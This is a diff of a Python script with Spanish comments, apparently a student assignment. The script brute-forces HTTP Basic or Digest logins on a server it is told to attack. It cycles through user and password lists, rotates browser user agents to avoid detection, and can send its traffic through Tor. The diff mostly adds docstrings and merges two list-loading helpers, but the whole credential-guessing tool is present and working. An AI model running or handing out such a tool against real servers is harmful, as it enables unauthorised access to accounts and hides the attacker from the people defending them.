@@ -12,6 +12,7 @@ from requests import get
 from requests.exceptions import ConnectionError
 from requests.auth import HTTPDigestAuth
 
+# User agents más comunes.
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
@@ -24,11 +25,24 @@ user_agents = [
 ]
 
 def printError(msg, exit = False):
+    """
+    Imprime msg en la salida de errores, termina el programa si se le indica.
+    Recibe:
+        msg (str) - Mensaje a imprimir
+        exit (bool) - Se termina el programa syss es True
+    Regresa:
+        None
+    """
     sys.stderr.write('Error:\t%s\n' % msg)
     if exit:
         sys.exit(1)
 
 def addOptions():
+    """
+    Regresa un objeto que permite leer argumentos ingresados al ejecutar el programa.
+    Regresa:
+        optparse.OptionParser - Objeto analizador de argumentos
+    """
     parser = optparse.OptionParser()
     parser.add_option('-v','--verbose', dest='verbose', default=False, action='store_true', help='If specified, prints detailed information during execution.')
     parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
@@ -47,6 +61,13 @@ def addOptions():
     return opts
     
 def checkOptions(options):
+    """
+    Revisa si hay algún error con las opciones recibidas.
+    Recibe:
+        options (optparse.OptionParser) - Objeto con opciones ingresadas al ejecutar programa
+    Regresa:
+        None
+    """
     if options.server is None:
         printError('Debes especificar un servidor a atacar.', True)
     if not options.password and not options.password_list:
@@ -61,6 +82,15 @@ def checkOptions(options):
         printError('Especificar un entero mayor a cero para el número de requests tras el cual se cambia el agente de usuario.', True)
 
 def reportResults(resultados, archivo, stdout):
+    """
+    Realiza un reporte con los resultados obtenidos, los imprime en la salida estándar o ambos.
+    Recibe:
+        resultados (str) - Cadena con el reporte
+        archivo (str) - Nombre del archivo a crear con el reporte
+        stdout (bool) - De ser True, se imprime resultados en salida estándar
+    Regresa:
+        None
+    """
     if not archivo or (archivo and stdout):
         print resultados
     if archivo:
@@ -68,12 +98,37 @@ def reportResults(resultados, archivo, stdout):
             f.write(resultados)
 
 def buildURL(server, port, protocol='http', tls=False):
+    """
+    Regresa una cadena del url con la dirección IP, puerto y protocolos específicados.
+    Recibe:
+        server (str) - Dirección IP del servidor
+        port (str) - Puerto a utilizar
+        protocol (str) - Protocolo a utilizar
+        tls (bool) - De ser True, se utiliza el protocolo HTTPS
+    Regresa:
+        str - URL generada
+    """
     if opts.tls:
         protocol = 'https'
     url = '%s://%s:%s' % (protocol, server, port)
     return url
 
 def makeRequest(host, user, password, verboso, digest, user_agent, tor_session):
+    """
+    Hace peticiones HTTP a el host especificado, utilizando al usuario
+    user y la contraseña password para la autenticación.
+    Recibe:
+        host (str) - URL del host al que se le manda la petición
+        user (str) - Nombre del usuario a autenticar
+        password (str) - Contraseña a utilizar para el usuario
+        verboso (bool) - De ser True, se utiliza el modo verboso
+        digest (bool) - De ser True, se usa modo de autenticación Digest
+                                 en vez de Basic.
+        user_agent (str) - Nombre del User Agent a utilizar
+        tor_session (bool) - Sólo si es True se realiza la petición a través de TOR
+    Regresa:
+        bool - True si se pudo autenticar al usuario user con la contraseña password
+    """
     try:
         headers = {'User-Agent': user_agent}
         auth = HTTPDigestAuth(user, password) if digest else (user, password)
@@ -92,6 +147,13 @@ def makeRequest(host, user, password, verboso, digest, user_agent, tor_session):
     return False
 
 def lista_archivo(archivo):
+    """
+    Regresa una lista con las palabras del archivo recibido
+    Recibe:
+        archivo (str) - Archivo a leer
+    Regresa:
+        list - Lista con palabras del archivo
+    """
     try:
         f = open(archivo)
         l = f.readlines()
@@ -100,18 +162,24 @@ def lista_archivo(archivo):
         printError('No se puede abrir el archivo %s.' % archivo, True)
     return [x[:-1] for x in l]
 
-def get_passwords(password, password_list):
-    if password:
-        return [password]
-    return lista_archivo(password_list)
-
-def get_users(user, user_list):
-    if user:
-        return [user]
-    return lista_archivo(user_list)
-
+def get_pass_users(pass_user, pass_user_list):
+    """
+    Regresa una lista de cadenas a partir de la cadena pass_user si está especificada,
+    o del archivo pass_user_list en otro caso.
+    Recibe:
+        pass_user (str) - Si no está especificada, se lee la lista pass_user_list
+        pass_user_list (str) - Nombre de archivo con lista de palabras
+    Regresa:
+        list - Lista de cadenas a partir de pass_user o pass_user_list
+    """
+    if pass_user:
+        return [pass_user]
+    return lista_archivo(pass_user_list)
 
 def get_tor_session():
+    """
+    Regresa una sesión de TOR
+    """
     session = requests.session()
     session.proxies = {'http':  'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050'}
@@ -122,8 +190,8 @@ if __name__ == '__main__':
         opts = addOptions()
         checkOptions(opts)
         url = buildURL(opts.server, port=opts.port, tls=opts.tls)
-        usuarios = get_users(opts.user, opts.user_list)
-        passwords = get_passwords(opts.password, opts.password_list)
+        usuarios = get_pass_users(opts.user, opts.user_list)
+        passwords = get_pass_users(opts.password, opts.password_list)
         tipo = "Digest" if opts.digest else "Basic"
         tor_session = None
         iprexp = r"(?:[0-9]{1,3}\.){3}[0-9]{1,3}"
